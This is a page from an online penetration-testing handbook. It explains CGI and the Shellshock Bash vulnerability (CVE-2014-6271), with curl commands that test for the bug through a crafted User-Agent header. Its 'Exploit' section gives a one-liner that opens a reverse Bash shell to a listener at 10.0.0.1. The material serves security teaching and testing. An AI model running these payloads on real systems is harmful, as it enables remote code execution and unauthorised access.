<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Common Gateway Interface Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.
Most servers expect CGI scripts to reside in a special directory, usually called cgi-bin, to handle the requests correctly and execute the program instead of returning the file content."><meta name=theme-color content="#FFFFFF"><meta property="og:title" content="CGI"><meta property="og:description" content="Common Gateway Interface Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.
Most servers expect CGI scripts to reside in a special directory, usually called cgi-bin, to handle the requests correctly and execute the program instead of returning the file content."><meta property="og:type" content="article"><meta property="og:url" content="https://0xffsec.com/book/web-applications/cgi/"><meta property="article:modified_time" content="2020-08-17T13:45:01+02:00"><title>CGI | 0xffsec Penetration Testing Book</title><link rel=manifest href=/book/manifest.json><link rel=icon href=/book/favicon.png type=image/x-icon><link rel=stylesheet href=/book/book.min.57bbbeacd5a09f86500c98715e9090c679adaabd3284c4cc22218be87c7e4a56.css integrity="sha256-V7u+rNWgn4ZQDJhxXpCQxnmtqr0yhMTMIiGL6Hx+SlY="><script defer src=/book/en.search.min.242a69005ec7bed3adcc14569b0d67b653ce9e16af2dd615a2bf3dd6187703fb.js integrity="sha256-JCppAF7HvtOtzBRWmw1ntlPOnhavLdYVor891hh3A/s="></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-142676329-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><nav><h2 class=book-brand><a href=/book><span>0xffsec Penetration Testing Book</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><span>Discovery and Scanning</span><ul><li><a href=/book/discovery-and-scanning/host-discovery/>Host Discovery</a></li><li><a href=/book/discovery-and-scanning/port-scanning/>Port Scanning</a></li></ul></li><li><a href=/book/exploits-search/>Exploits Search</a></li><li><a href=/book/brute-forcing/>Brute Forcing</a></li><li><a href=/book/services/>Services</a><ul><li><a href=/book/services/ftp/>FTP - 21</a></li><li><a href=/book/services/smtp/>SMTP - 25 / 465 / 587</a></li><li><a href=/book/services/dns/>DNS - 53</a></li><li><a href=/book/services/finger/>Finger - 79</a></li><li><a href=/book/services/http-https/>HTTP/S - 80 / 443</a></li><li><a href=/book/services/pop/>POP - 110 / 995</a></li><li><a href=/book/services/nntp/>NNTP - 119 / 433 / 563</a></li><li><a href=/book/services/smb/>SMB - 139 / 445</a></li><li><a href=/book/services/imap/>IMAP - 143 / 993</a></li></ul></li><li><a href=/book/steganography/>Steganography</a></li><li><span>Web Applications</span><ul><li><a href=/book/web-applications/cgi/ class=active>CGI</a></li><li><a href=/book/web-applications/command-injection/>Command Injection</a></li><li><a href=/book/web-applications/file-inclusion-and-path-traversal/>File Inclusion</a></li></ul></li><li><span>Shells</span><ul><li><a href=/book/shells/reverse-shells/>Reverse Shells</a></li><li><a href=/book/shells/restricted-shells/>Restricted Shells</a></li></ul></li><li><a href=/book/notes/ class=collapsed>Notes</a></li></ul></nav><script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/book/svg/menu.svg class=book-icon alt=Menu></label>
<strong>CGI</strong>
<label for=toc-control><img src=/book/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#shellshock>Shellshock</a><ul><li><a href=#test>Test</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li></ul></nav></aside></header><article class=markdown><h1 id=common-gateway-interface>Common Gateway Interface</h1><p>Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.</p><p>Most servers expect CGI scripts to reside in a special directory, usually called <code>cgi-bin</code>, to handle the requests correctly and execute the program instead of returning the file content. <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup></p><h2 id=shellshock>Shellshock</h2><p>Shellshock (<a href=https://nvd.nist.gov/vuln/detail/CVE-2014-6271>CVE-2014-6271</a>) is an Arbitrary Code Execution (ACE) vulnerability that affects Linux and Unix command-line shell, aka the GNU Bourne Again Shell.</p><p>GNU Bourne Again Shell, or Bash, is an interpreter that allows users to send commands on Unix and Linux systems, typically by connecting over SSH or Telnet but it can also operate as a parser for CGI scripts.</p><blockquote class="book-hint info">In addition to CGI-based web servers, it also affects OpenSSH servers, DHCP clients, Qmail servers and restricted shells of the IBM Hardware Management Console (IBM HMC)</blockquote><p>The vulnerability occurs when the variables sent to the server, are passed and interpreted by Bash. This variable involves a specially crafted environment variable containing an exported function definition, followed by arbitrary commands. Bash incorrectly executes the trailing commands when it imports the function.</p><pre><code>Environment variable with
function definition                          Expected command
         +                                          +
         |                                          |
+--------+--------+ +----------------+ +------------+--------------+
| env x='() { :;};| |echo vulnerable'| |bash -c &quot;echo Real command&quot;|
+-----------------+ +-------+--------+ +---------------------------+
                            |
                            +
            Arbitrary command executed by Bash
</code></pre><h3 id=test>Test</h3><h4 id=reflected>Reflected</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl -fs -H <span style=color:#ed9d13>&#34;user-agent: () { :; }; echo; echo &#39;vulnerable&#39;&#34;</span> http://10.0.0.3/cgi-bin/vulnerable | grep vulnerable
</code></pre></div><h4 id=blind>Blind</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl -fs -H <span style=color:#ed9d13>&#34;user-agent: () { :; }; /bin/bash -c &#39;sleep 5&#39;&#34;</span> http://10.0.0.3/cgi-bin/vulnerable
</code></pre></div><details><summary>Parameters</summary><div class=markdown-inner><ul><li><code>-f</code>: fail silently on HTTP errors.</li><li><code>-s</code>: silent mode.</li><li><code>-H</code>: pass custom header(s) to server.</li></ul></div></details><h3 id=exploit>Exploit</h3><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl -fs -H <span style=color:#ed9d13>&#34;user-agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/1234 0&gt;&amp;1&#34;</span> http://10.0.0.3/cgi-bin/vulnerable
</code></pre></div><h2 id=further-reading>Further Reading</h2><ul><li><a href=https://blog.cloudflare.com/inside-shellshock/>Inside Shellshock: How hackers are using it to exploit systems</a></li><li><a href=https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29>Wikipedia - Shellshock (software bug)</a></li></ul><section class=footnotes role=doc-endnotes><hr><ol><li id=fn:1 role=doc-endnote><p>Gundavaram, Shishir. “The Common Gateway Interface (CGI).” O’Reilly Media - Technology and Business Training, O’Reilly & Associates, Inc., <a href=https://www.oreilly.com/openbook/cgi/ch01_01.html>https://www.oreilly.com/openbook/cgi/ch01_01.html</a>. <a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></section></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/0xffsec/book/commit/38a642e2e3f4e5b0941fe5b9797ba63f3f4e485c title="Last modified by Max Rodrigo | August 17, 2020" target=_blank rel=noopener><img src=/book/svg/calendar.svg class=book-icon alt=Calendar>
<span>August 17, 2020</span></a></div><div><a class="flex align-center" href=https://github.com/0xffsec/book/edit/master/content//web-applications/cgi.md target=_blank rel=noopener><img src=/book/svg/edit.svg class=book-icon alt=Edit>
<span>Edit this page</span></a></div></div></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><nav id=TableOfContents><ul><li><a href=#shellshock>Shellshock</a><ul><li><a href=#test>Test</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li></ul></nav></aside></main></body></html>